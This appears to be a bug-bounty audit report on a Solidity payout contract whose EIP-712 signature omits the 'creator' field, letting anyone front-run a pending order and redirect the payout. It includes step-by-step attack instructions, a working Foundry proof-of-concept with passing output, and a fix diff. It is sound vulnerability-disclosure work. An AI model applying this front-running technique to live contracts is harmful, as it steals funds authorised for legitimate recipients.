# High: payout order `creator` is not covered by the signature - a pending order can be front-run and credited to the attacker

## Summary

The EIP-712 digest for payout orders in `src/PayoutOrderLib.sol` does not include the `creator`
field. `processOrder` checks that `order.creator == msg.sender`, but because the signature does not
cover the creator, any address can submit the same order and signature with its own address in
that field.
An attacker who sees a creator's pending `processOrder` transaction copies it, changes only
`creator`, gets mined first and withdraws the full amount the authority authorised for the
intended creator. The creator's own transaction then reverts and the order cannot be used again.

## Vulnerability details

The order struct has four fields (`src/PayoutOrderLib.sol`, lines 16-21), and `creator` is
documented as "The account the order was issued to" (line 13). The type hash (lines 28-29) lists only
three of them:

```solidity
bytes32 internal constant PAYOUT_ORDER_TYPEHASH =
    keccak256("PayoutOrder(uint256 orderId,uint256 amount,uint64 deadline)");
```

The `hash` function (lines 47-49) encodes the same three fields:

```solidity
function hash(PayoutOrder calldata order) internal pure returns (bytes32) {
    return keccak256(abi.encode(PAYOUT_ORDER_TYPEHASH, order.orderId, order.amount, order.deadline));
}
```

This means the digest, and therefore the signature, is valid for any creator. In `processOrder`
(`src/ReelPayoutDesk.sol`, lines 143-157) the only link between the order and the caller is
line 144:

```solidity
if (order.creator != msg.sender) revert NotOrderCreator();
```

This compares the caller with a field the caller controls, and the allocation then goes to
`msg.sender` (line 155). The check is insufficient because an attacker can:

1. Observe a pending `processOrder(order, signature)` transaction in the mempool.
2. Copy the order and the signature.
3. Change only the `creator` field to their own address. The digest does not change, so
   `recoverSigner` still returns `authority` (lines 151-152).
4. Submit with a higher priority fee. `orderProcessed[orderId]` is set and the amount is allocated
   to the attacker.
5. Call `withdraw` and receive the payout tokens.
6. The legitimate creator's transaction then reverts with `OrderAlreadyProcessed` (line 149). The
   authority signed that order id once, so the creator has nothing left to submit.

## Impact

High. This is the second row of the programme's impact table: "Theft, redirection or permanent loss
of an amount the authority did authorise for a specific creator (a creator's order or credited
balance)".

- The attacker receives the full amount of the victim's order, up to `ORDER_CEILING` (75,000 tokens)
  per order. Every order submitted through the public mempool is exposed.
- `orderId`, `amount` and `deadline` are signed and cannot be changed, so the loss is limited to
  amounts the authority did sign; nothing is issued beyond the limit.

Attacker's starting privileges: none. The attacker is neither the owner nor the authority and
holds no order of their own; they only need to see the pending transaction, which the programme
lists as in scope.

## Proof of concept

Save as `test/CreatorFrontRun.t.sol`. The test deploys `ReelPayoutDesk` as written and only calls
its external functions.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../src/ReelPayoutDesk.sol";
import "../src/PayoutOrderLib.sol";

contract MockToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract CreatorFrontRunTest is Test {
    uint256 constant RESERVE = 250_000 ether;
    uint256 constant AUTHORITY_KEY = 0xA11CE5;

    ReelPayoutDesk desk;
    MockToken token;
    address authority;
    address owner = makeAddr("owner");
    address funder = makeAddr("funder");
    address victim = makeAddr("victim");
    address attacker = makeAddr("attacker");

    function setUp() public {
        authority = vm.addr(AUTHORITY_KEY);
        token = new MockToken();
        desk = new ReelPayoutDesk(owner, authority, address(token));

        token.mint(funder, RESERVE);
        vm.startPrank(funder);
        token.approve(address(desk), RESERVE);
        desk.fundReserve(RESERVE);
        vm.stopPrank();
    }

    function test_creatorFrontRun() public {
        // the authority issues order #7 to the victim: 40,000 tokens
        PayoutOrder memory order = PayoutOrder({
            orderId: 7,
            creator: victim,
            amount: 40_000 ether,
            deadline: uint64(block.timestamp + 3 days)
        });
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(AUTHORITY_KEY, desk.getOrderDigest(order));
        bytes memory signature = abi.encodePacked(r, s, v);

        // the attacker copies the pending order and changes only the creator field
        PayoutOrder memory attackerOrder = PayoutOrder({
            orderId: order.orderId,
            creator: attacker,
            amount: order.amount,
            deadline: order.deadline
        });
        assertEq(desk.getOrderDigest(attackerOrder), desk.getOrderDigest(order), "same digest");

        // attacker submits first, then withdraws
        vm.prank(attacker);
        desk.processOrder(attackerOrder, signature);
        vm.prank(attacker);
        desk.withdraw(40_000 ether);

        // the victim's own transaction now reverts
        vm.prank(victim);
        vm.expectRevert(ReelPayoutDesk.OrderAlreadyProcessed.selector);
        desk.processOrder(order, signature);

        console2.log("attacker token balance:", token.balanceOf(attacker));
        console2.log("victim token balance  :", token.balanceOf(victim));
        console2.log("victim desk balance   :", desk.balanceOf(victim));
        console2.log("desk reserve          :", token.balanceOf(address(desk)));

        assertEq(token.balanceOf(attacker), 40_000 ether, "attacker received the payout");
        assertEq(token.balanceOf(victim), 0, "victim got nothing");
        assertEq(desk.balanceOf(victim), 0, "nothing allocated to the victim");
        assertEq(token.balanceOf(address(desk)), RESERVE - 40_000 ether);
    }
}
```

Run with:

```bash
forge test --match-test test_creatorFrontRun -vv
```

```
No files changed, compilation skipped

Ran 1 test for test/CreatorFrontRun.t.sol:CreatorFrontRunTest
[PASS] test_creatorFrontRun() (gas: 158291)
Logs:
  attacker token balance: 40000000000000000000000
  victim token balance  : 0
  victim desk balance   : 0
  desk reserve          : 210000000000000000000000

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 16.74ms (14.72ms CPU time)

Ran 1 test suite in 19.16ms (16.74ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

The attacker ends with the 40,000 tokens of order #7, the victim's `processOrder` reverts with
`OrderAlreadyProcessed`, and the victim has no desk balance and no tokens.

## Recommended mitigation

Include the `creator` field in the type string and in the struct hash, so the signature is specific
to the intended creator:

```diff
 bytes32 internal constant PAYOUT_ORDER_TYPEHASH =
-    keccak256("PayoutOrder(uint256 orderId,uint256 amount,uint64 deadline)");
+    keccak256("PayoutOrder(uint256 orderId,address creator,uint256 amount,uint64 deadline)");

 function hash(PayoutOrder calldata order) internal pure returns (bytes32) {
-    return keccak256(abi.encode(PAYOUT_ORDER_TYPEHASH, order.orderId, order.amount, order.deadline));
+    return keccak256(abi.encode(PAYOUT_ORDER_TYPEHASH, order.orderId, order.creator, order.amount, order.deadline));
 }
```

The authority's signing service must be updated to sign the new type.
